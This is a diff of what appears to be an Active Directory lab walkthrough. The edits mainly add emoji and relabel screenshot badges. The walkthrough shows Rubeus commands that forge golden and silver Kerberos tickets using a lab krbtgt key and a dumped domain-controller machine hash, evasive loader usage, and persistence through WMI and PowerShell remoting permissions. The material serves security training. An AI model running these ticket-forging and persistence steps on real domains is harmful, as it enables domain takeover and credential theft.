@@ -17,13 +17,13 @@ Below command (**to be run as domain administrator**, see *Learning Objective 08
 
 ![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:152 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt`:
 ```
 [SNIP]
 
-[*] Action: Build TGT
+[*] Action: Build TGT📌
 
 [*] Building PAC
 
@@ -35,7 +35,7 @@ Below command (**to be run as domain administrator**, see *Learning Objective 08
 [*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
 [*] KDCKey         : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
 [*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
-[*] Service        : krbtgt📌
+[*] Service        : krbtgt👤
 [*] Target         : dollarcorp.moneycorp.local
 
 [*] Generating EncTicketPart
@@ -43,7 +43,7 @@ Below command (**to be run as domain administrator**, see *Learning Objective 08
 [*] Encrypting EncTicketPart
 [*] Generating Ticket
 [*] Generated KERB-CRED
-[*] Forged a TGT for 'Administrator🎭@dollarcorp.moneycorp.local'
+[*] Forged a TGT for 'Administrator🎭@dollarcorp.moneycorp.local🏛️'
 
 [*] AuthTime       : 2/13/2025 1:39:41 AM
 [*] StartTime      : 2/13/2025 1:39:41 AM
@@ -63,7 +63,7 @@ Current LogonId is 0:0x848dc4
 
 Cached Tickets: (1)
 
-#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL
+#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
         Server: krbtgt📌/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
         KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
         Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
@@ -112,11 +112,9 @@ CCDCLCSWRP;;;S-1-5-21-719815819-3726368948-3917688648-20607)(A;;CCDCLCSWRP;;;S-1
 0607)
 ```
 
-`exit`
-
 Now, we can execute WMI queries on the DC as `student422`.
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
 ```
@@ -132,6 +130,7 @@ RegisteredUser  : Windows User
 SerialNumber    : 00454-30000-00000-AA745
 Version         : 10.0.20348
 ```
+🚩
 
 Similar modification can be done to **PowerShell remoting configuration**.
 
@@ -139,13 +138,13 @@ In rare cases, you may get an *I/O error* while using the below command, please 
 
 ![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:152 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt`:
 ```
 [SNIP]
 
-[*] Action: Build TGT
+[*] Action: Build TGT📌
 
 [*] Building PAC
 
@@ -157,7 +156,7 @@ In rare cases, you may get an *I/O error* while using the below command, please 
 [*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
 [*] KDCKey         : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
 [*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
-[*] Service        : krbtgt📌
+[*] Service        : krbtgt👤
 [*] Target         : dollarcorp.moneycorp.local
 
 [*] Generating EncTicketPart
@@ -165,7 +164,7 @@ In rare cases, you may get an *I/O error* while using the below command, please 
 [*] Encrypting EncTicketPart
 [*] Generating Ticket
 [*] Generated KERB-CRED
-[*] Forged a TGT for 'Administrator🎭@dollarcorp.moneycorp.local'
+[*] Forged a TGT for 'Administrator🎭@dollarcorp.moneycorp.local🏛️'
 
 [*] AuthTime       : 2/13/2025 1:39:41 AM
 [*] StartTime      : 2/13/2025 1:39:41 AM
@@ -185,7 +184,7 @@ Current LogonId is 0:0x848dc4
 
 Cached Tickets: (1)
 
-#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL
+#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
         Server: krbtgt📌/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
         KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
         Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
@@ -216,7 +215,7 @@ request. For more information, see the about_Remote_Troubleshooting Help topic.
 
 Now, we can run commands using PowerShell remoting on the DC without DA privileges.
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
 ```
@@ -236,20 +235,13 @@ Run the below command **as DA**.
 
 ![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
-
-`klist`:
-```
-Current LogonId is 0:0x848dc4
-
-Cached Tickets: (0)
-```
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:152 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt`:
 ```
 [SNIP]
 
-[*] Action: Build TGT
+[*] Action: Build TGT📌
 
 [*] Building PAC
 
@@ -261,7 +253,7 @@ Cached Tickets: (0)
 [*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
 [*] KDCKey         : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
 [*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
-[*] Service        : krbtgt📌
+[*] Service        : krbtgt👤
 [*] Target         : dollarcorp.moneycorp.local
 
 [*] Generating EncTicketPart
@@ -269,7 +261,7 @@ Cached Tickets: (0)
 [*] Encrypting EncTicketPart
 [*] Generating Ticket
 [*] Generated KERB-CRED
-[*] Forged a TGT for 'Administrator🎭@dollarcorp.moneycorp.local'
+[*] Forged a TGT for 'Administrator🎭@dollarcorp.moneycorp.local🏛️'
 
 [*] AuthTime       : 2/13/2025 1:39:41 AM
 [*] StartTime      : 2/13/2025 1:39:41 AM
@@ -289,7 +281,7 @@ Current LogonId is 0:0x848dc4
 
 Cached Tickets: (1)
 
-#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL
+#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
         Server: krbtgt📌/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
         KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
         Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
@@ -324,7 +316,7 @@ dcorp-dc.dollarcorp.moneycorp.local student422📌
 
 Now, we can retrieve hash as `student422`.
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
 ```
@@ -340,12 +332,14 @@ VERBOSE: LSA Key        : BDC807FEC0BB38EB0AE338451573904220F8B69404F719BDDB03F8
 
 ComputerName MachineAccountHash
 ------------ ------------------
-dcorp-dc🔑   68d6c096c7cfee52a45d6207489526bc🔑
+dcorp-dc🖥️  68d6c096c7cfee52a45d6207489526bc🔑
 ```
 
-We can use the machine account hash to create silver tickets. Create silver tickets for **HOST** and **RPCSS** using the machine account hash to execute WMI queries.
+We can use the machine account hash to create silver tickets.
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+Create silver tickets for **HOST** and **RPCSS** using the machine account hash to execute WMI queries.
+
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4:68d6c096c7cfee52a45d6207489526bc /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt`:
 ```
@@ -373,7 +367,7 @@ We can use the machine account hash to create silver tickets. Create silver tick
 [*] Encrypting EncTicketPart
 [*] Generating Ticket
 [*] Generated KERB-CRED
-[*] Forged a TGS for 'Administrator'🎭 to 'host/dcorp-dc.dollarcorp.moneycorp.local'
+[*] Forged a TGS for 'Administrator'🎭 to 'host📌/dcorp-dc.dollarcorp.moneycorp.local🏛️'
 
 [*] AuthTime       : 2/14/2025 6:51:24 AM
 [*] StartTime      : 2/14/2025 6:51:24 AM
@@ -391,7 +385,7 @@ We can use the machine account hash to create silver tickets. Create silver tick
 ```
 [SNIP]
 
-[*] Action: Build TGS
+[*] Action: Build TGS📌
 
 [SNIP]
 
@@ -413,7 +407,7 @@ We can use the machine account hash to create silver tickets. Create silver tick
 [*] Encrypting EncTicketPart
 [*] Generating Ticket
 [*] Generated KERB-CRED
-[*] Forged a TGS for 'Administrator'🎭 to 'rpcss/dcorp-dc.dollarcorp.moneycorp.local'
+[*] Forged a TGS for 'Administrator'🎭 to 'rpcss📌/dcorp-dc.dollarcorp.moneycorp.local🏛️'
 
 [*] AuthTime       : 2/14/2025 6:54:32 AM
 [*] StartTime      : 2/14/2025 6:54:32 AM
@@ -433,7 +427,7 @@ Current LogonId is 0:0x38c010
 
 Cached Tickets: (2)
 
-#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL
+#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
         Server: rpcss📌/dcorp-dc.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
         KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
         Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
@@ -444,7 +438,7 @@ Cached Tickets: (2)
         Cache Flags: 0
         Kdc Called:
 
-#1>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL
+#1>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
         Server: host📌/dcorp-dc.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
         KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
         Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
